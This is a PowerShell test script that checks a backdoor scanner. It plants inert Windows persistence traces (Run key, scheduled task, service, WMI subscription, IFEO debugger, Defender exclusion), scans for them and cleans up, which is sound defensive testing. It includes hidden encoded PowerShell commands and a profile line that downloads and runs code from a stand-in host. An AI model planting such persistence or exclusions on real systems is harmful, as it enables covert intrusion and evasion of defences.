<#
.SYNOPSIS
    Measures what CheckBackdoor detects: creates HARMLESS persistence techniques, runs the
    scan, checks which ones were found and removes everything.

.DESCRIPTION
    Use it ONLY in a test virtual machine. Like Atomic Red Team, it simulates the traces a
    backdoor leaves (startup entry, scheduled task, service, WMI, Defender exclusion...) but
    with commands that do nothing: the "payload" is a Write-Output, and no entry is ever
    run (the task starts in 2099, the service is manual).

    At the end it always removes what it created, even if the scan fails.
    It writes a Markdown table with the result of each technique.

    Without administrator rights it tests only the per-user techniques.

.PARAMETER SkipVmCheck
    The script refuses to start if Windows does not look like a virtual machine. Use it only
    if your VM is not recognized (the manufacturer does not contain Virtual, VMware...).

.EXAMPLE
    .\tools\Test-Detections.ps1
#>
[CmdletBinding()]
param(
    [string]$OutputDir,
    [switch]$SkipVmCheck
)

$ErrorActionPreference = 'Stop'
$root = Split-Path -Parent $PSScriptRoot
$engine = Join-Path $root 'CheckBackdoor.ps1'
if (-not $OutputDir) { $OutputDir = Join-Path $root 'report\validation' }
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null

# --- Only in a virtual machine -------------------------------------------------------
$cs = Get-CimInstance Win32_ComputerSystem
$isVm = "$($cs.Manufacturer) $($cs.Model)" -match 'Virtual|VMware|VirtualBox|QEMU|KVM|Hyper-V|Parallels|Xen|innotek|Bochs'
if (-not $isVm -and -not $SkipVmCheck) {
    Write-Host "`n  This PC does not look like a virtual machine ($($cs.Manufacturer) $($cs.Model))." -ForegroundColor Red
    Write-Host "  Test-Detections creates test startup entries and services: run it only in a VM.`n" -ForegroundColor Red
    exit 2
}
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Harmless payload, encoded the way malware does it (assembled here, not written out in full)
$payload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Output "CheckBackdoor harmless test"'))
$hiddenPs = "powershell.exe -NoProfile -WindowStyle Hidden -Enc $payload"
$tag = 'CBTest'
$work = Join-Path $env:PUBLIC "$tag"
New-Item -ItemType Directory -Path $work -Force | Out-Null

$techniques = @(
    @{ Id = 'run'; Mitre = 'T1547.001'; Name = 'Run entry (HKCU) with hidden PowerShell'; Admin = $false
        Setup = { New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name "$tag-Run" -Value $hiddenPs -Force | Out-Null }
        Cleanup = { Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name "$tag-Run" -ErrorAction SilentlyContinue } }
    @{ Id = 'startup'; Mitre = 'T1547.001'; Name = 'Script in the Startup folder'; Admin = $false
        Setup = { Set-Content -LiteralPath (Join-Path ([Environment]::GetFolderPath('Startup')) "$tag.vbs") -Value "' ${tag}: test file, does nothing" }
        Cleanup = { Remove-Item -LiteralPath (Join-Path ([Environment]::GetFolderPath('Startup')) "$tag.vbs") -Force -ErrorAction SilentlyContinue } }
    @{ Id = 'task'; Mitre = 'T1053.005'; Name = 'Scheduled task with hidden PowerShell'; Admin = $false
        Setup = {
            $a = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -WindowStyle Hidden -Enc $payload"
            $t = New-ScheduledTaskTrigger -Once -At ([datetime]'2099-01-01')
            Register-ScheduledTask -TaskPath "\$tag\" -TaskName "$tag-Task" -Action $a -Trigger $t -Force | Out-Null }
        Cleanup = { Unregister-ScheduledTask -TaskPath "\$tag\" -TaskName "$tag-Task" -Confirm:$false -ErrorAction SilentlyContinue } }
    @{ Id = 'profile'; Mitre = 'T1546.013'; Name = 'PowerShell profile that downloads and runs'; Admin = $false
        Setup = {
            $p = $PROFILE.CurrentUserAllHosts
            $script:ProfileBackup = if (Test-Path -LiteralPath $p) { [IO.File]::ReadAllText($p) } else { $null }
            New-Item -ItemType Directory -Path (Split-Path $p) -Force | Out-Null
            $line = '# ' + $tag + "`n" + 'I' + 'EX (New-Object Net.' + 'WebClient).Download' + 'String(''https://example.invalid/' + $tag + ''')'
            Add-Content -LiteralPath $p -Value $line }
        Cleanup = {
            $p = $PROFILE.CurrentUserAllHosts
            if ($null -eq $script:ProfileBackup) { Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue }
            else { [IO.File]::WriteAllText($p, $script:ProfileBackup) } } }
    @{ Id = 'bits'; Mitre = 'T1197'; Name = 'BITS job with a notify command'; Admin = $false
        Setup = {
            & bitsadmin.exe /create $tag | Out-Null
            & bitsadmin.exe /addfile $tag "https://example.invalid/$tag.bin" (Join-Path $work "$tag.bin") | Out-Null
            & bitsadmin.exe /SetNotifyCmdLine $tag 'C:\Windows\System32\cmd.exe' "cmd.exe /c echo $tag" | Out-Null }
        Cleanup = { & bitsadmin.exe /cancel $tag | Out-Null } }
    @{ Id = 'ifeo'; Mitre = 'T1546.012'; Name = 'IFEO debugger on a program'; Admin = $true
        Setup = {
            $k = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$tag.exe"
            New-Item -Path $k -Force | Out-Null
            New-ItemProperty -Path $k -Name Debugger -Value (Join-Path $work "$tag-debugger.exe") -Force | Out-Null }
        Cleanup = { Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$tag.exe" -Recurse -Force -ErrorAction SilentlyContinue } }
    @{ Id = 'service'; Mitre = 'T1543.003'; Name = 'Service that starts hidden PowerShell'; Admin = $true
        Setup = { & sc.exe create "$tag-Svc" binPath= "cmd.exe /c $hiddenPs" start= demand | Out-Null }
        Cleanup = { & sc.exe delete "$tag-Svc" | Out-Null } }
    @{ Id = 'wmi'; Mitre = 'T1546.003'; Name = 'Permanent WMI subscription'; Admin = $true
        Setup = {
            $ns = 'root\subscription'
            $f = Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{ Name = "$tag-Filter"; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'
                Query = "SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Year = 2099" }
            $c = Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{ Name = "$tag-Consumer"; CommandLineTemplate = "cmd.exe /c echo $tag" }
            Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{ Filter = $f; Consumer = $c } | Out-Null }
        Cleanup = {
            $ns = 'root\subscription'
            Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object { $_.Filter -match $tag } | Remove-WmiObject
            Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter "Name='$tag-Consumer'" -ErrorAction SilentlyContinue | Remove-WmiObject
            Get-WmiObject -Namespace $ns -Class __EventFilter -Filter "Name='$tag-Filter'" -ErrorAction SilentlyContinue | Remove-WmiObject } }
    @{ Id = 'exclusion'; Mitre = 'T1562.001'; Name = 'Microsoft Defender exclusion'; Admin = $true
        Setup = { Add-MpPreference -ExclusionPath $work }
        Cleanup = { Remove-MpPreference -ExclusionPath $work -ErrorAction SilentlyContinue } }
)

$results = New-Object System.Collections.Generic.List[object]
$created = New-Object System.Collections.Generic.List[object]
try {
    foreach ($t in $techniques) {
        if ($t.Admin -and -not $isAdmin) {
            $results.Add([pscustomobject]@{ Technique = $t.Name; Mitre = $t.Mitre; Result = 'Not tested'; Severity = ''; Note = 'Needs administrator' })
            continue
        }
        try { & $t.Setup; $created.Add($t) }
        catch { $results.Add([pscustomobject]@{ Technique = $t.Name; Mitre = $t.Mitre; Result = 'Not created'; Severity = ''; Note = $_.Exception.Message }) }
    }

    Write-Host "  Created $($created.Count) test techniques. Starting the scan..." -ForegroundColor Cyan
    $scanOut = Join-Path $OutputDir 'scan'
    & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $engine -NoElevate -Quiet -NoOpen -OutputDir $scanOut -Skip 'FileSystem,Processes,Network,Browser,Injections,Timeline' | Out-Null
    $json = Get-ChildItem -LiteralPath $scanOut -Filter 'scan_*.json' | Sort-Object LastWriteTime | Select-Object -Last 1
    $report = [IO.File]::ReadAllText($json.FullName) | ConvertFrom-Json

    foreach ($t in $created) {
        # The technique is detected if a finding (not just informational) contains the marker
        $hits = @($report.Findings | Where-Object {
                $_.Severity -ne 'Info' -and ("$($_.Title) $($_.Path) $($_.Evidence) $($_.Detail)" -match $tag -or
                    ($t.Id -eq 'exclusion' -and "$($_.Title) $($_.Evidence)" -match [regex]::Escape($work)) -or
                    ($t.Id -eq 'profile' -and $_.Title -like 'PowerShell profile*')) })
        $order = @{ High = 0; Medium = 1; Low = 2 }
        $best = $hits | Sort-Object { $order[$_.Severity] } | Select-Object -First 1
        $results.Add([pscustomobject]@{
                Technique = $t.Name; Mitre = $t.Mitre
                Result = if ($best) { 'Detected' } else { 'NOT detected' }
                Severity = if ($best) { $best.Severity } else { '' }
                Note = if ($best) { $best.Title } else { '' }
            })
    }
} finally {
    foreach ($t in $created) {
        try { & $t.Cleanup } catch { Write-Host "  Could not remove '$($t.Name)': $($_.Exception.Message)" -ForegroundColor Red }
    }
    Remove-Item -LiteralPath $work -Recurse -Force -ErrorAction SilentlyContinue
}

$os = Get-CimInstance Win32_OperatingSystem
$md = New-Object System.Text.StringBuilder
[void]$md.AppendLine("# Detection test - $(Get-Date -Format 'yyyy-MM-dd HH:mm')")
[void]$md.AppendLine('')
[void]$md.AppendLine("System: $($os.Caption) $($os.Version), language $((Get-Culture).Name), administrator: $isAdmin, VM: $isVm")
[void]$md.AppendLine('')
[void]$md.AppendLine('| Technique | MITRE | Result | Severity | Finding |')
[void]$md.AppendLine('|---|---|---|---|---|')
foreach ($r in $results) { [void]$md.AppendLine("| $($r.Technique) | $($r.Mitre) | $($r.Result) | $($r.Severity) | $(($r.Note -replace '\|', '/')) |") }
$file = Join-Path $OutputDir "validation_$(Get-Date -Format 'yyyyMMdd_HHmmss').md"
[IO.File]::WriteAllText($file, $md.ToString(), (New-Object Text.UTF8Encoding($false)))
Write-Host ''
$results | Format-Table -AutoSize | Out-String -Width 200 | Write-Host
Write-Host "  Table saved to $file" -ForegroundColor Cyan
if (@($results | Where-Object Result -eq 'NOT detected').Count) { exit 1 } else { exit 0 }
